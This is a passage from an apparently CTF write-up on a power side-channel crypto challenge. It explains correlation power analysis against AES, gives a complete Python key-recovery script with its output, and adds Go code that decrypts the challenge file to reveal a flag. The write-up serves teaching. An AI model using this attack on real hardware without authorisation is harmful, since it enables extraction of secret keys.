class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intermediate</span><span class="params">(pt, keyguess)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sbox[pt ^ keyguess]</span><br><span class="line"></span><br><span class="line">HW = [bin(n).count(<span class="string">"1"</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Aes key is 16 bytes so for each best guess</span></span><br><span class="line"><span class="keyword">for</span> bnum <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        cpaoutput = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        maxcpa = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        <span class="comment"># for each keyguess</span></span><br><span class="line">        <span class="keyword">for</span> kguess <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Subkey %2d, hyp = %02x: "</span>%(bnum, kguess),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">#Initialize arrays &amp; variables to zero</span></span><br><span class="line">            sumnum = np.zeros(numpoint)</span><br><span class="line">            sumden1 = np.zeros(numpoint)</span><br><span class="line">            sumden2 = np.zeros(numpoint)</span><br><span class="line"></span><br><span class="line">            hyp = np.zeros(numtraces)</span><br><span class="line">            <span class="comment"># calculate every hamming distance for all the traces for this key guess</span></span><br><span class="line">            <span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">                hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)]</span><br></pre></td></tr></table></figure><p>Now still in the same loop we want to calculate the <strong>means</strong> of the <strong>hypothesis</strong> and the <strong>points of the trace</strong>, this comes from the correlation formula in <strong>Figure 2</strong>.<br>We can say that the two aleatory variable <strong>X</strong> and <strong>Y</strong> where <strong>X</strong> is the hamming distance of the key hypothesis for every character of plaintext tested and <strong>Y</strong> for every points power consumption points in every trace. So concluding the <strong>Xi</strong> in the formula is the first <strong>HW[intermediate(plaintext[x0][k0], kguess)]</strong> and <strong>yi</strong> is all the points in the power consumption trace, while <strong>x̅</strong>  is the mean of variable <strong>X</strong> and <strong>ȳ</strong> is the respective mean of variable <strong>Y</strong>.</p><p>Calculation the means:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Mean of hypothesis</span></span><br><span class="line">meanh = np.mean(hyp, dtype=np.float64)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Mean of all points in trace</span></span><br><span class="line">meant = np.mean(traces, axis=<span class="number">0</span>, dtype=np.float64)</span><br></pre></td></tr></table></figure><p>Now calculating the summations in the formula and performing the square root:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#For each trace, do the following</span></span><br><span class="line"><span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">    hdiff = (hyp[tnum] - meanh)</span><br><span class="line">    tdiff = traces[tnum,:] - meant</span><br><span class="line"></span><br><span class="line">    sumnum = sumnum + (hdiff*tdiff)</span><br><span class="line">    sumden1 = sumden1 + hdiff*hdiff </span><br><span class="line">    sumden2 = sumden2 + tdiff*tdiff</span><br><span class="line"></span><br><span class="line">cpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 )</span><br><span class="line">maxcpa[kguess] = max(abs(cpaoutput[kguess]))</span><br></pre></td></tr></table></figure><p>So after calculating the correlation for every key guess the best guess key is the one with highest value of correlation:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bestguess[bnum] = np.argmax(maxcpa)</span><br></pre></td></tr></table></figure><p>In the end we get the complete key used in the encryption, the full script:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">HW = [bin(n).count(<span class="string">"1"</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line">sbox=(</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intermediate</span><span class="params">(pt, keyguess)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sbox[pt ^ keyguess]</span><br><span class="line"></span><br><span class="line">traces = np.load(<span class="string">'powertraces.npy'</span>)</span><br><span class="line">pt = np.load(<span class="string">'plaintexts.npy'</span>)</span><br><span class="line"></span><br><span class="line">bestguess = []</span><br><span class="line"><span class="keyword">if</span> bestguess == []:</span><br><span class="line"></span><br><span class="line">    numtraces = np.shape(traces)[<span class="number">0</span>]<span class="number">-1</span></span><br><span class="line">    numpoint = np.shape(traces)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    bestguess = [<span class="number">0</span>]*<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> bnum <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        cpaoutput = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        maxcpa = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> kguess <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="comment">#Initialize arrays &amp; variables to zero</span></span><br><span class="line">            sumnum = np.zeros(numpoint)</span><br><span class="line">            sumden1 = np.zeros(numpoint)</span><br><span class="line">            sumden2 = np.zeros(numpoint)</span><br><span class="line"></span><br><span class="line">            hyp = np.zeros(numtraces)</span><br><span class="line">            <span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">                hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">#Mean of hypothesis</span></span><br><span class="line">            meanh = np.mean(hyp, dtype=np.float64)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#Mean of all points in trace</span></span><br><span class="line">            meant = np.mean(traces, axis=<span class="number">0</span>, dtype=np.float64)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#For each trace, do the following</span></span><br><span class="line">            <span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">                hdiff = (hyp[tnum] - meanh)</span><br><span class="line">                tdiff = traces[tnum,:] - meant</span><br><span class="line"></span><br><span class="line">                sumnum = sumnum + (hdiff*tdiff)</span><br><span class="line">                sumden1 = sumden1 + hdiff*hdiff </span><br><span class="line">                sumden2 = sumden2 + tdiff*tdiff</span><br><span class="line"></span><br><span class="line">            cpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 )</span><br><span class="line">            maxcpa[kguess] = max(abs(cpaoutput[kguess]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        bestguess[bnum] = np.argmax(maxcpa)</span><br><span class="line"></span><br><span class="line">    key = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> bestguess: </span><br><span class="line">        key += <span class="string">"%02x"</span>%b</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Best Key Guess: %s"</span> % key</span><br></pre></td></tr></table></figure><p>Running it : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python leak_power.py</span><br><span class="line">Best Key Guess: d2dea057d1145f456796966024a703b2</span><br></pre></td></tr></table></figure><p>The key is <strong>d2dea057d1145f456796966024a703b2</strong> now that we have the key we can decrypt the cyphertext, we can do this ith a few lines of <strong>go</strong>:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io/ioutil"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line"><span class="string">"gopkg.in/square/go-jose.v2"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Read input from file</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">readInput</span><span class="params">(path <span class="keyword">string</span>)</span> []<span class="title">byte</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> bytes []<span class="keyword">byte</span></span><br><span class="line"><span class="keyword">var</span> err error</span><br><span class="line">bytes, err = ioutil.ReadFile(path)</span><br><span class="line">exitOnError(err, <span class="string">"unable to read input"</span>)</span><br><span class="line"><span class="keyword">return</span> bytes</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Exit and print error message if we encountered a problem</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">exitOnError</span><span class="params">(err error, msg <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Fprintf(os.Stderr, <span class="string">"%s: %s\n"</span>, msg, err)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">obj, err := jose.ParseEncrypted(<span class="keyword">string</span>(readInput(<span class="string">"instructions_corrected.jwe"</span>)))</span><br><span class="line">exitOnError(err, <span class="string">"unable to parse message"</span>)</span><br><span class="line">plaintext, err := obj.Decrypt(<span class="string">"\xd2\xde\xa0\x57\xd1\x14\x5f\x45\x67\x96\x96\x60\x24\xa7\x03\xb2"</span>)</span><br><span class="line">exitOnError(err, <span class="string">"unable to decrypt message"</span>)</span><br><span class="line">fmt.Print(<span class="keyword">string</span>(plaintext))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Running it we get the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ go get gopkg.in/square/go-jose.v2</span><br><span class="line">$ go run aes_dec.go</span><br><span class="line">CONFIDENTIAL</span><br><span class="line"></span><br><span class="line">To <span class="built_in">disable</span> C4, you will need:</span><br><span class="line">- 6 bits of Dragon Sumac</span><br><span class="line">- 1 nibble of Winter Spice</span><br><span class="line">- 1 byte of Drake Cardamom</span><br><span class="line">- 1 flag with value flag-e2f27bac480a7857de45</span><br><span class="line">- 2 diskfulls of Tundra Chives</span><br><span class="line">- 5 forks</span><br><span class="line"></span><br><span class="line">Grind the Dragon Sumac <span class="keyword">in</span> a cup, making sure you don<span class="string">'t break the cup as it'</span>s probably a delicate cup. Add a sprinkle of</span><br><span class="line">liquid ice to turn it into a cream-like paste, <span class="keyword">then</span> add the Winter Spice, first almost everything, <span class="keyword">then</span> the last tiny</span><br><span class="line">remnants.</span><br><span class="line"></span><br><span class="line">Fill a pan with elemental water, add the mixture and cool it down with how cool you are, <span class="keyword">then</span> bring the mixture</span><br><span class="line">to a boil. Let it cool down to the body temperature of a reptile before adding the Drake Cardamom and Tundra Chives,</span><br><span class="line">all at once of one, <span class="keyword">then</span> half at a time of the other.</span><br><span class="line"></span><br><span class="line">Bring everything back to a boil, turn of the heat, mix with the forks and <span class="built_in">let</span> everything cool down. If you</span><br><span class="line">touch the liquid and it burns you, it hasn<span class="string">'t cooled down enough.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Whisk the mixture heavily to aerate it. Stop when it'</span>s frothy.</span><br><span class="line"></span><br><span class="line">Drinking the potion will <span class="built_in">disable</span> C4.</span><br><span class="line"></span><br><span class="line">note: A small, but very cold amount is needed <span class="keyword">for</span> the potion to be effective. Mixing it <span class="keyword">in</span> a milkshake could work, but</span><br><span class="line">be wary of brain freeze.</span><br></pre></td></tr></table></figure><p>The flag was <strong>flag-e2f27bac480a7857de45</strong></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul><li><a href="https://www.tandfonline.com/doi/full/10.1080/23742917.2016.1231523" target="_blank" rel="noopener">https://www.tandfonline.com/doi/full/10.1080/23742917.2016.1231523</a></li><li><a href="https://wiki.newae.com/Making_Scripts" target="_blank" rel="noopener">https://wiki.newae.com/Making_Scripts</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;C4: leaky power&lt;br&gt;222&lt;br&gt;&lt;br&gt;C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is 
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="cpa" scheme="https://teamrocketist.github.io/tags/cpa/"/>
    
      <category term="power_analysis" scheme="https://teamrocketist.github.io/tags/power-analysis/"/>
    
  </entry>
